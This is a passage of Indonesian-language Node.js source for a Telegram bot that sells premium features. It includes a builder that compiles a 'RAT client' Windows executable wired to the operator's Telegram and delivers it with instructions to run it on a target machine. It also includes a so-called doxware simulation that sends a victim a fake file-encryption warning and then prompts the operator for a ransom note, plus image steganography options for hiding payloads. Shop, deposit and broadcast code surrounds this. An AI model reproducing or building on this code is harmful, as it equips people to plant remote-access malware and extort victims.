                .replace('%%BOT_TOKEN%%', config.botToken)
                .replace('%%CHAT_ID%%', config.adminId);
            fs.writeFileSync(tempScriptPath, finalScript);

            await bot.editMessageText("... (1/4) Menginstal dependensi...", { chat_id: chatId, message_id: generatingMessage.message_id });

            await new Promise((resolve, reject) => {
                 exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`NPM Install Error: ${stderr}`);
                        reject(new Error('Gagal menginstal dependensi untuk RAT.'));
                        return;
                    }
                    resolve(stdout);
                });
            });

            await bot.editMessageText("... (2/4) Mengkompilasi executable...", { chat_id: chatId, message_id: generatingMessage.message_id });

            const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
            await new Promise((resolve, reject) => {
                exec(`${pkgPath} . --targets node16-win-x64 --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`PKG Error: ${stderr}`);
                        reject(new Error('Gagal mengkompilasi executable.'));
                        return;
                    }
                    resolve(stdout);
                });
            });

            await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });

            await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda. Jalankan di mesin Windows target." });
            await bot.deleteMessage(chatId, generatingMessage.message_id);

        } catch (e) {
            console.error("Gagal membuat RAT executable:", e);
            await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
        } finally {
            if (fs.existsSync(tempDir)) {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        }
    }
    else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
        awanPremiumHandler.execute(bot, query);
    }
    else if (data === "unchek_menu") {
        const user = await User.findOne({ chatId: userId });
        if (!user || !user.isPremium) {
            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk Pengguna Premium.', show_alert: true });
        }

        const unchekMessage = "Selamat datang di Menu Unchek/Akun Fresh! Pilih salah satu opsi:";
        const unchekButtons = [
            { text: "Akun Montoon", callback_data: "akun_montoon" },
            { text: "Send Akun Fresh", callback_data: "send_akun_fresh" },
            { text: "Send Akun Emas", callback_data: "send_akun_emas" },
            { text: "⬅️ Kembali", callback_data: "back_to_start" }
        ];

        await bot.editMessageText(unchekMessage, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: createInlineKeyboard(unchekButtons)
        });
    }
    else if (data === "akun_montoon" || data === "send_akun_fresh" || data === "send_akun_emas") {
        bot.sendMessage(chatId, "tolong sebutkan jumlah yang ingin di kirimkan");
        userStates[chatId] = { action: `awaiting_quantity_${data}` };
    }
    else if (data === 'doxware_simulation_start') {
        const user = await User.findOne({ chatId: userId });
        if (!user || !user.isPremium) {
            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
        }

        // Start the state machine
        userStates[chatId] = { action: 'doxware_awaiting_filename' };
        await bot.sendMessage(chatId, "🎓 **Memulai Simulasi Doxware**\n\nLangkah 1: Silakan berikan nama untuk file payload simulasi Anda (contoh: `invoice_penting.js`). Ini adalah nama file yang akan Anda kirim ke target.");
        await bot.answerCallbackQuery(query.id);
    }
    else if (data.startsWith('doxware_encrypt_')) {
        const simulationId = data.split('_')[2];
        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });

        if (!simulation || simulation.creatorChatId !== userId) {
            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
        }

        if (simulation.status !== 'connected') {
            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini tidak dalam status "terhubung".', show_alert: true });
        }

        const victimChatId = simulation.victimChatId;

        // --- "Real" Encryption (Safe Version) ---
        const tempDir = path.join(__dirname, 'temp', simulation.simulationId);
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        const sampleFilePath = path.join(tempDir, 'sample_document.txt');
        const encryptedFilePath = path.join(tempDir, 'sample_document.txt.locked');
        const sampleContent = 'Ini adalah konten dari dokumen rahasia Anda yang sekarang telah kami amankan.';

        fs.writeFileSync(sampleFilePath, sampleContent);

        // Encryption logic
        const algorithm = 'aes-256-cbc';
        // Use a fixed-length key derived from the user's password
        const key = crypto.createHash('sha256').update(String(simulation.decryptionKey)).digest('base64').substr(0, 32);
        const iv = crypto.randomBytes(16);

        const cipher = crypto.createCipheriv(algorithm, key, iv);
        const input = fs.createReadStream(sampleFilePath);
        const output = fs.createWriteStream(encryptedFilePath);

        const stream = input.pipe(cipher).pipe(output);

        stream.on('finish', async () => {
            // Send the encrypted file to the creator as "proof"
            await bot.sendDocument(chatId, encryptedFilePath, {}, {
                caption: `File sampel telah dienkripsi dengan kunci \`${simulation.decryptionKey}\`. File terenkripsi dikirim sebagai bukti.`
            });

            // Send warning message to the victim
            const encryptionMessage = `
‼️ **PERINGATAN KEAMANAN** ‼️

File-file penting Anda di direktori Dokumen, Foto, dan Unduhan telah dienkripsi dengan algoritma AES-256.
Contoh file yang terpengaruh:
- \`C:\\Users\\User\\Documents\\laporan_keuangan.docx\` -> \`laporan_keuangan.docx.locked\`
- \`C:\\Users\\User\\Photos\\liburan_2025.jpg\` -> \`liburan_2025.jpg.locked\`
- \`C:\\Users\\User\\Downloads\\software_penting.zip\` -> \`software_penting.zip.locked\`

Jangan coba-coba mematikan atau me-reboot perangkat Anda, karena ini dapat menyebabkan kerusakan data permanen.
`;
            await bot.sendMessage(victimChatId, encryptionMessage, { parse_mode: 'Markdown' });

            // Update simulation status
            simulation.status = 'encrypted';
            await simulation.save();

            // Notify the creator and provide the next step
            await bot.editMessageText("✅ Enkripsi data target berhasil disimulasikan. File bukti telah dikirim.", {
                chat_id: chatId,
                message_id: query.message.message_id,
            });

            // Clean up temp files
            fs.rmSync(tempDir, { recursive: true, force: true });

            const keyboard = createInlineKeyboard([
                { text: "💸 Kirim Pesan Tebusan", callback_data: `doxware_ransom_${simulation.simulationId}` }
            ]);
            await bot.sendMessage(chatId, "Anda sekarang dapat mengirimkan pesan tebusan kepada target.", { reply_markup: keyboard });
        });

        const keyboard = createInlineKeyboard([
            { text: "💸 Kirim Pesan Tebusan", callback_data: `doxware_ransom_${simulation.simulationId}` }
        ]);
        await bot.sendMessage(chatId, "Anda sekarang dapat mengirimkan pesan tebusan kepada target.", { reply_markup: keyboard });

        await bot.answerCallbackQuery(query.id);
    }
    else if (data.startsWith('doxware_ransom_')) {
        const simulationId = data.split('_')[2];
        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });

        if (!simulation || simulation.creatorChatId !== userId) {
            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
        }

        if (simulation.status !== 'encrypted') {
            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini belum dienkripsi.', show_alert: true });
        }

        // Set state to await the ransom note text
        userStates[chatId] = { action: `doxware_awaiting_ransom_note_${simulationId}` };

        // Acknowledge the button press and then send a new message
        await bot.answerCallbackQuery(query.id);
        await bot.editMessageReplyMarkup({inline_keyboard: []}, {
             chat_id: chatId,
             message_id: query.message.message_id
        });
        await bot.sendMessage(chatId, "✍️ Sekarang, ketikkan pesan tebusan yang ingin Anda kirim ke target. Anda dapat menggunakan Markdown untuk format teks.");
    }
    else if (data.startsWith('steg_')) {
        const user = await User.findOne({ chatId: userId });
        if (!user || !user.isPremium) {
            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
        }

        const tool = data.split('_')[1];
        userStates[chatId] = { action: `awaiting_cover_${tool}` };

        let promptMessage = "";
        switch (tool) {
            case 'steghide':
                promptMessage = "Anda memilih Steghide. Silakan kirim gambar (JPG/BMP) yang akan digunakan sebagai sampul.";
                break;
            case 'exiftool':
                promptMessage = "Anda memilih ExifTool. Silakan kirim gambar yang metadatanya ingin Anda ubah.";
                break;
            case 'zip':
                promptMessage = "Anda memilih Zip & Rename. Silakan kirim gambar (JPG) yang akan digunakan sebagai sampul.";
                break;
            case 'qrcode':
                promptMessage = "Anda memilih QR Code. Silakan kirim gambar yang akan disisipi QR code.";
                break;
        }

        await bot.sendMessage(chatId, promptMessage);
        await bot.answerCallbackQuery(query.id);
    }
    else if (data === "menfess") handleMenfess(chatId);
    else if (data === "confess") handleConfess(chatId);
    else if (data === "saran") handleSaran(chatId);
    else if (data === "laporan") handleLaporan(chatId);
    else if (data === "download_menu") showDownloadMenu(chatId);
    else if (data === "tiktok_v2") handleTikTokV2(chatId);
    else if (data === "twitter") handleTwitter(chatId);
    else if (data.startsWith("reply_feedback_")) {
      const targetUserId = data.split("_")[2];

      if (userId.toString() !== config.adminId) {
          return bot.answerCallbackQuery(query.id, { text: 'Anda tidak diizinkan untuk melakukan tindakan ini.', show_alert: true });
      }

      bot.sendMessage(chatId, `✍️ Silakan ketik balasan Anda untuk pengguna dengan ID: ${targetUserId}`);

      bot.once('message', async (replyMsg) => {
          if (replyMsg.from.id.toString() !== config.adminId) {
              return;
          }

          const replyText = replyMsg.text;

          const userMessage = `
- - - - - - - - - - - - - -
📬 **BALASAN DARI ADMIN** 📬
- - - - - - - - - - - - - -
Halo! Admin telah membalas feedback yang Anda kirimkan.

💬 **Pesan Balasan:**
${replyText}

- - - - - - - - - - - - - -
Terima kasih telah memberikan masukan!
`;

          try {
              await bot.sendMessage(targetUserId, userMessage, { parse_mode: 'Markdown' });
              bot.sendMessage(chatId, `✅ Balasan Anda telah berhasil dikirim ke pengguna ID: ${targetUserId}.`);
          } catch (error) {
              console.error(`Gagal mengirim balasan ke user ${targetUserId}:`, error);
              bot.sendMessage(chatId, `❌ Gagal mengirim balasan. Mungkin pengguna telah memblokir bot.`);
          }
      });
    }
    bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Gagal menangani callback query:", error.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses permintaan Anda. Coba lagi nanti.");
  }
});

function showDownloadMenu(chatId) {
    const buttons = [
        { text: "🎵 TikTok v2", callback_data: "tiktok_v2" },
        { text: "🐦 Twitter", callback_data: "twitter" },
    ];
    bot.sendMessage(chatId, "Pilih fitur unduhan:", { reply_markup: createInlineKeyboard(buttons) });
}

const qs = require('qs');

function handleTikTokV2(chatId) {
    bot.sendMessage(chatId, "Silakan kirim tautan TikTok.");
    bot.once("message", async (msg) => {
        const url = msg.text;
        try {
            const response = await axios.post('https://lovetik.com/api/ajax/search', qs.stringify({
                query: url
            }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                }
            });
            const data = response.data;
            console.log("Respon dari lovetik.com:", JSON.stringify(data, null, 2));
            const videoUrl = data.links[0].a;
            console.log("URL Video:", videoUrl);
            await bot.sendVideo(chatId, videoUrl, {
                caption: data.desc,
            });
        } catch (error) {
            console.error("Gagal mengunduh video TikTok:", error);
            bot.sendMessage(chatId, "Gagal mengunduh video TikTok. Pastikan tautan valid.");
        }
    });
}

function handleTwitter(chatId) {
    bot.sendMessage(chatId, "Silakan kirim tautan Twitter.");
    bot.once("message", async (msg) => {
        const url = msg.text;
        try {
            const response = await axios.get(`https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(url)}`);
            const data = response.data.data;
            await bot.sendVideo(chatId, data.downloadLink, {
                caption: "Video dari Twitter",
            });
        } catch (error) {
            console.error("Gagal mengunduh video Twitter:", error);
            bot.sendMessage(chatId, "Gagal mengunduh video Twitter. Pastikan tautan valid.");
        }
    });
}

bot.onText(/\/level/, async (msg) => {
  const chatId = msg.chat.id;
  const user = await User.findOne({ chatId });
  if (user) {
    bot.sendMessage(chatId, `Level Anda saat ini: ${user.level}\nXP: ${user.xp}/${user.level * 100}`);
  }
});

async function showAllMenu(chatId, isAdminUser = false,  isUserbot = false) {
    let message = "*Semua Menu:*\n\n";
    message += "┌\n";
    message += "├ 🛍️ *Produk*\n";
    message += "├ 👤 *Daftar*\n";
    message += "├ 👤 *Profil*\n";
    message += "├ ❤️ *Wishlist*\n";
    message += "├ 🛒 *Cart*\n";
    message += "├ 💰 *Deposit*\n";
    if (!isUserbot) message += "├ 🤖 *Claim Trial Userbot*\n";
    message += "├ 📜 *Riwayat Transaksi*\n";
    message += "└\n\n";
    if (isAdminUser) {
        message += "┌\n";
        message += "├ 👑 *Admin Menu*\n";
        message += "├ 📤 *Upload Produk*\n";
        message += "├ ➕ *Buat Kategori*\n";
        message += "├ ➖ *Hapus Kategori*\n";
        message += "├ 📢 *Broadcast*\n";
        message += "└\n\n";
    }
    message += "Pilih menu atau kembali ke menu utama.";
    const buttons = [
        { text: "⬅️ Kembali ke Menu Utama", callback_data: "back_to_start" }
    ];
    bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
}

async function sendOtp(phoneNumber) {
  try {
    const client = await initializeTDLibClient(config.apiId, config.apiHash);
    await client.send({
      '@type': 'setAuthenticationPhoneNumber',
      phone_number: phoneNumber
    });
    return new Promise((resolve, reject) => {
      client.once('update', (update) => {
        if (update['@type'] === 'updateAuthorizationState' && update.authorization_state['@type'] === 'authorizationStateWaitCode') {
          resolve(client);
        }
      });
    });
  } catch (error) {
    console.error("Gagal mengirim OTP:", error);
    throw error;
  }
}

async function claimTrialUserbot(chatId) {
    // Start the state machine for userbot login
    userStates[chatId] = { action: 'userbot_awaiting_phone' };
    bot.sendMessage(chatId, "🤖 **Login Userbot**\n\nLangkah 1: Silakan masukkan nomor telepon Anda dengan format internasional (contoh: `+628123456789`).");
}

async function showAdminMenu(chatId) {
        if (!isAdmin(chatId)) {
            return bot.sendMessage(chatId, "Anda tidak memiliki izin untuk mengakses menu ini.");
        }

        let message = "*Menu Admin:*\n\nSilakan pilih opsi:";
        const buttons = [
            { text: "🤖 List Userbot", callback_data: "admin_list_userbot" },
            { text: "👑 Add Owner", callback_data: "admin_add_owner" },
             // Tambahkan tombol lain di sini ...
        ];
        bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
    }

 function isValidUserbotData(data) {
     return (
         typeof data.phoneNumber === 'string' &&
         data.phoneNumber.startsWith('+') &&
         typeof data.userHash === 'string'
     );
 }

async function showCategories(chatId) {
  try {
    const categories = await Category.find();
    if (categories.length === 0) return bot.sendMessage(chatId, "Tidak ada kategori.");
    const buttons = categories.map((category) => ({
        text: category.name,
        callback_data: `category_${category.name}`,
    }));
    buttons.push({ text: "Kembali", callback_data: "back_to_start" });
    bot.sendMessage(chatId, "Pilih Kategori:", { reply_markup: createInlineKeyboard(buttons) });
  } catch (error) {
    console.error("Gagal menampilkan kategori:", error.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan kategori. Coba lagi nanti.");
  }
}

async function showProductsByCategory(chatId, categoryName, page) {
    try {
        const productsInCategory = await Product.find({ category: categoryName });
        if (productsInCategory.length === 0) {
            return bot.sendMessage(chatId, `Tidak ada produk di ${categoryName}.`);
        }

        const productsPerPage = 5;
        const startIndex = page * productsPerPage;
        const endIndex = startIndex + productsPerPage;
        const productsToShow = productsInCategory.slice(startIndex, endIndex);

        let message = `Produk ${categoryName}:\n\n`;
        for (const product of productsToShow) message += `- ${product.name} - Rp ${product.price}\n`;
        message += `\nHal ${page + 1} dari ${Math.ceil(productsInCategory.length / productsPerPage)}`;

        const keyboardButtons = productsToShow.map(product => ([
            { text: `🛒 Beli: ${product.name}`, callback_data: `product_${product._id}` },
            { text: "❤️ Wishlist", callback_data: `wishlist_add_${product._id}` },
            { text: "🛒 Cart", callback_data: `cart_add_${product._id}` },
        ]));

        let buttons = keyboardButtons.reduce((acc, row) => acc.concat(row), []);
        buttons.push({ text: "⬅️ Kembali ke Kategori", callback_data: "back_to_categories" });

        const navigationButtons = [];
        if (page > 0) {
            navigationButtons.push({ text: "⬅️ Prev", callback_data: `productlist_${categoryName}_${page - 1}` });
        }
        if (endIndex < productsInCategory.length) {
            navigationButtons.push({ text: "Next ➡️", callback_data: `productlist_${categoryName}_${page + 1}` });
        }

        const keyboard = createInlineKeyboard([...buttons, ...navigationButtons]);
        bot.sendMessage(chatId, message, { reply_markup: keyboard });
    } catch (error) {
        console.error("Gagal menampilkan produk:", error);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan produk. Coba lagi nanti.");
    }
}

async function registerUser(chatId, userId) {
  try {
    let user = await User.findOne({ chatId });
    if (user && user.daftar) {
      return bot.sendMessage(chatId, "Anda sudah terdaftar.");
    }

    if (!user) {
      user = new User({ chatId: chatId, type: "private" });
    }

    bot.sendMessage(chatId, "Masukkan alamat email Anda:");
    bot.once("message", async (msg) => {
      const email = msg.text.trim();
      // regex to validate email
      if (!/^\S+@\S+\.\S+$/.test(email)) {
        return bot.sendMessage(chatId, "Format email tidak valid.");
      }
      user.email = email;
      user.daftar = true;
      await user.save();
      let message = `Selamat! Anda terdaftar dengan email ${email}.\n\nDeposit dengan /deposit.\nSaldo: Rp 0`;
      bot.sendMessage(chatId, message);
    });
  } catch (error) {
    console.error("Gagal mendaftarkan user:", error.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat mendaftar. Coba lagi nanti.");
  }
}

async function showUserProfile(chatId, userId) {
  try {
        const user = await User.findOne({ chatId: chatId });
        if (!user) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        let message = `*Profil Anda*\n\n`;
        message += `ID: ${userId}\n`;
        message += `Saldo: Rp ${user.saldo}\n`;
        message += `Tanggal Daftar: ${moment(user.joinDate).format('DD MMMM YYYY')}\n\n`;
        message += `Pilih opsi:`;

        const buttons = [
            { text: "📜 Riwayat Transaksi", callback_data: "transaction_history" },
            { text: "❤️ Wishlist", callback_data: "wishlist" },
            { text: "🛒 Cart", callback_data: "cart" },
        ];
        bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
    } catch (error) {
        console.error("Gagal menampilkan profil:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan profil. Coba lagi nanti.");
    }
}

async function showTransactionHistory(chatId, userId) {
    try {
           const transactions = await Transaction.find({ userId: chatId }).sort({ date: -1 }).limit(10);
        if (transactions.length === 0) {
            return bot.sendMessage(chatId, "Belum ada riwayat transaksi.");
        }

        let message = "*Riwayat Transaksi*\n\n";
        transactions.forEach(transaction => {
            message += `- ${transaction.type}: Rp ${transaction.amount} (${moment(transaction.date).format('DD MMMM YYYY HH:mm')})\n`;
        });
        bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
    } catch (error) {
        console.error("Gagal menampilkan riwayat transaksi:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menampilkan riwayat transaksi. Coba lagi nanti.");
    }
}

async function showMidtransPaymentOptions(chatId) {
  bot.sendMessage(chatId, "Masukkan jumlah deposit (minimal Rp 10.000):");
  bot.once("message", async (msg) => {
    const amount = parseInt(msg.text);
    if (isNaN(amount) || amount < 10000) {
      return bot.sendMessage(chatId, "Jumlah tidak valid. Masukkan angka minimal 10000.");
    }
    handleMidtransDeposit(chatId, msg.from.id, "gopay", amount);
  });
}

bot.onText(/\/deposit/, (msg) => {
  const chatId = msg.chat.id;
  const buttons = [
    { text: "Midtrans", callback_data: "deposit_midtrans" },
    { text: "QRIS Manual", callback_data: "deposit_qris" },
  ];
  bot.sendMessage(chatId, "Pilih metode deposit:", {
    reply_markup: createInlineKeyboard(buttons),
  });
});

async function handleMidtransDeposit(chatId, userId, paymentType, amount) {
  try {
    const user = await User.findOne({ chatId });
    if (!user) {
      return bot.sendMessage(chatId, "Anda belum terdaftar.");
    }

    const orderId = `order-${Date.now()}-${userId}-${paymentType}`;

    const snap = new midtransClient.Snap({
      isProduction: true,
      serverKey: config.midtransServerKey,
      clientKey: config.midtransClientKey,
    });

    const parameter = {
      transaction_details: { order_id: orderId, gross_amount: amount },
      customer_details: {
        first_name: userId.toString(),
        last_name: "",
        email: user.email || `${userId}@example.com`,
        phone: "",
      },
      payment_type: paymentType,
    };

    const transaction = await snap.createTransaction(parameter);
    const paymentUrl = transaction.redirect_url;

    bot.sendMessage(
      chatId,
      `Silakan deposit Rp ${amount} melalui link berikut:\n\n[Bayar Sekarang](${paymentUrl})`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );

    const checkStatus = setInterval(async () => {
      try {
        const statusResponse = await snap.transaction.status(orderId);
        if (statusResponse.transaction_status === 'capture' || statusResponse.transaction_status === 'settlement') {
          clearInterval(checkStatus);
          user.saldo += amount;
          const newTransaction = new Transaction({
            userId: chatId,
            type: "deposit",
            amount: amount,
            date: moment().format(),
          });
          await Promise.all([user.save(), newTransaction.save()]);
          bot.sendMessage(chatId, `Deposit Rp ${amount} berhasil. Saldo Anda sekarang: Rp ${user.saldo}`);
        } else if (statusResponse.transaction_status === 'expire' || statusResponse.transaction_status === 'cancel' || statusResponse.transaction_status === 'deny') {
          clearInterval(checkStatus);
          bot.sendMessage(chatId, "Pembayaran gagal atau dibatalkan.");
        }
      } catch (error) {
        console.error("Gagal memeriksa status transaksi:", error);
        clearInterval(checkStatus);
      }
    }, 5000);

  } catch (error) {
    console.error("Midtrans API error:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses deposit.");
  }
}

bot.on("photo", (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const photo = msg.photo[msg.photo.length - 1].file_id;
  if (!msg.caption || !msg.caption.startsWith("/send")) return;
  const amount = msg.caption.split(" ")[1];
  if (!amount || isNaN(parseInt(amount))) {
    return bot.sendMessage(chatId, "Format salah. Gunakan /send [jumlah]");
  }
  let message = `Bukti transfer dari ${userId} sejumlah Rp ${amount}:\n\n/acc ${userId} ${amount}`;
  bot.sendPhoto(config.adminId, photo, { caption: message });
  bot.sendMessage(chatId, "Bukti transfer dikirim ke admin.");
});

bot.onText(/\/acc (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdmin(msg.from.id)) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

    const userId = match[1];
    const amount = parseInt(match[2]);

    try {
        const userToAcc = await User.findOne({ chatId: userId });
        if (!userToAcc) {
            return bot.sendMessage(chatId, "User tidak ditemukan.");
        }

        userToAcc.saldo += amount;

        const transaction = new Transaction({
            userId: userToAcc.chatId,
            type: "deposit",
            amount: amount,
            date: moment().format()
        });

        await Promise.all([userToAcc.save(), transaction.save()]);

        bot.sendMessage(userId, `Deposit Rp ${amount} dikonfirmasi. Saldo: Rp ${userToAcc.saldo}`);
        bot.sendMessage(chatId, `Saldo ${userId} ditambahkan.`);
    } catch (error) {
        console.error("Gagal memproses acc:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat memproses deposit.");
    }
});

async function downloadFile(fileLink, filePath) {
    console.log(`Mencoba mengunduh dari ${fileLink} ke ${filePath}`);
    try {
        const response = await axios({
            method: "GET",
            url: fileLink,
            responseType: "stream",
        });
        const writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);
        return new Promise((resolve, reject) => {
            writer.on("finish", () => {
                console.log(`Berhasil mengunduh file ke ${filePath}`);
                resolve();
            });
            writer.on("error", (err) => {
                console.error(`Gagal menulis file ke ${filePath}:`, err);
                reject(err);
            });
        });
    } catch (error) {
        console.error(`Gagal mengunduh dari ${fileLink}:`, error);
        throw error;
    }
}

bot.onText(/\/upload/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isAdmin(msg.from.id)) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

  if (!msg.reply_to_message || !msg.reply_to_message.document)
    return bot.sendMessage(
      chatId,
      "Balas ke pesan yang berisi file untuk mengupload."
    );

  const fileId = msg.reply_to_message.document.file_id;
  const fileName = msg.reply_to_message.document.file_name;
  const mimeType = msg.reply_to_message.document.mime_type;

  bot.sendMessage(
    chatId,
    `Upload file: ${fileName}\n\nSilakan berikan informasi produk dengan format:\nKategori|Harga|Deskripsi|Link Gambar\n\nContoh:\nWeb|0|Gratis untuk semua|https://example.com/gambar.jpg`
  );

  bot.once("text", async (infoMsg) => {
    const productInfo = infoMsg.text.split("|");
    if (productInfo.length !== 4)
      return bot.sendMessage(chatId, "Format informasi produk tidak valid.");

    const [category, price, description, imageUrl] = productInfo.map((s) =>
      s.trim()
    );

    try {
      const existingCategory = await Category.findOne({ name: category.toLowerCase() });
      if (!existingCategory) {
        return bot.sendMessage(chatId, `Kategori "${category}" tidak valid. Buat kategori terlebih dahulu.`);
      }
      const parsedPrice = parseInt(price);
      if (isNaN(parsedPrice))
        return bot.sendMessage(chatId, "Harga harus berupa angka.");

      let productId;
      try {
        const fileLink = await bot.getFileLink(fileId);
        const filePath = path.join(__dirname, "files", fileName);
        fs.mkdirSync(path.join(__dirname, "files"), { recursive: true });
        await downloadFile(fileLink, filePath);
        const productUrl = `${config.botBaseUrl}?product=${productId}`;
        const newProduct = new Product({
            name: fileName,
            category: category.toLowerCase(),
            price: parsedPrice,
            description: description,
            imageUrl: imageUrl,
            filePath: filePath,
            mimeType: mimeType,
            productUrl: productUrl,
        });
        const savedProduct = await newProduct.save();
        productId = savedProduct._id;

        bot.sendMessage(
          chatId,
          `Produk "${fileName}" berhasil diupload dengan ID: ${productId}.`
        );

        const users = await User.find();
        for (const user of users) {
          if (user.daftar) {
            try {
              let message = `*Produk Baru Telah Ditambahkan!*\n\n`;
              message += `*${fileName}*\n`;
              message += `Kategori: ${category}\n`;
              message += `Harga: Rp ${parsedPrice}\n`;
              message += `Deskripsi: ${description}\n\n`;
              let notificationMessage = `*Produk Baru Telah Ditambahkan!*\n\n`;
              notificationMessage += `*${fileName}*\n`;
              notificationMessage += `Kategori: ${category}\n`;
              notificationMessage += `Harga: Rp ${parsedPrice}\n`;
              notificationMessage += `Deskripsi: ${description}\n\n`;

              const sentMessage = await bot.sendPhoto(user.chatId, imageUrl, {
                caption: notificationMessage,
                parse_mode: "Markdown",
                disable_web_page_preview: true,
                reply_markup: createInlineKeyboard([
                  {text: "Lihat Detail Produk", url: `https://t.me/${config.botUsername}?start=${productId}`}
                ])
              });
              await bot.forwardMessage(user.chatId, chatId, sentMessage.message_id);
            } catch (error) {
              console.error(`Gagal mengirim notifikasi ke ${user.chatId}:`, error.message);
            }
          }
        }
      } catch (error) {
        console.error("Gagal mengupload file:", error);
        bot.sendMessage(chatId, "Gagal mengupload file.");
      }
    } catch (error) {
      console.error("Gagal memvalidasi kategori:", error.message);
      bot.sendMessage(chatId, "Terjadi kesalahan saat memvalidasi kategori. Coba lagi nanti.");
    }
  });
});

bot.onText(/\/createcategory (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAdmin(msg.from.id)) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

  const categoryName = match[1].trim().toLowerCase();
  try {
        const existingCategory = await Category.findOne({ name: categoryName });
        if (existingCategory) {
            return bot.sendMessage(chatId, `Kategori "${categoryName}" sudah ada.`);
        }

        const newCategory = new Category({ name: categoryName });
        await newCategory.save();
        bot.sendMessage(chatId, `Kategori "${categoryName}" berhasil dibuat.`);
    } catch (error) {
        console.error("Gagal membuat kategori:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat membuat kategori. Coba lagi nanti.");
    }
});

bot.onText(/\/deletecategory (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
    if (!isOwner) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

    const categoryName = match[1].trim();

    try {
        const deletedCategory = await Category.findOneAndDelete({ name: categoryName });
        if (!deletedCategory) {
            return bot.sendMessage(chatId, `Kategori "${categoryName}" tidak ditemukan.`);
        }

        await Product.deleteMany({ category: categoryName });

        bot.sendMessage(chatId, `Kategori "${categoryName}" berhasil dihapus.`);
    } catch (error) {
        console.error("Gagal menghapus kategori:", error.message);
        bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus kategori. Coba lagi nanti.");
    }
});

bot.onText(/\/broadcast( .*)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isOwner = isAdmin(userId) || (msg.chat.type !== 'private' && await isGroupOwner(bot, chatId, userId));
  if (!isOwner) return bot.sendMessage(chatId, "Anda tidak memiliki izin.");

  const broadcastMessage = match[1] ? match[1].trim() : '';
  if (!broadcastMessage) {
    return bot.sendMessage(chatId, "Silakan berikan pesan untuk disiarkan.");
  }

  bot.sendMessage(chatId, "Pilih target siaran:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Semua Pengguna", callback_data: "broadcast_all" }],
        [{ text: "Pengguna Userbot", callback_data: "broadcast_userbot" }],
        [{ text: "Pengguna Biasa", callback_data: "broadcast_regular" }]
      ]
    }
  });

  bot.once("callback_query", async (query) => {
    const target = query.data.split("_")[1];
    let users;

    if (target === "all") {
      users = await User.find({ daftar: true });
    } else if (target === "userbot") {
      const userbots = await Userbot.find({ isActive: true });
      const userbotIds = userbots.map(u => u.userId);
      users = await User.find({ chatId: { $in: userbotIds } });
    } else if (target === "regular") {
      const userbots = await Userbot.find({ isActive: true });
      const userbotIds = userbots.map(u => u.userId);
      users = await User.find({ chatId: { $nin: userbotIds }, daftar: true });
    }

    if (!users || users.length === 0) {
      return bot.sendMessage(chatId, "Tidak ada pengguna untuk target ini.");
    }

    const formattedMessage = `||${broadcastMessage}||`;
    const sentMessage = await bot.sendMessage(chatId, `\`\`\`${formattedMessage}\`\`\``, { parse_mode: "Markdown" });

    let successCount = 0;
    let failureCount = 0;

    for (const user of users) {
        try {
            await bot.forwardMessage(user.chatId, chatId, sentMessage.message_id);
            successCount++;
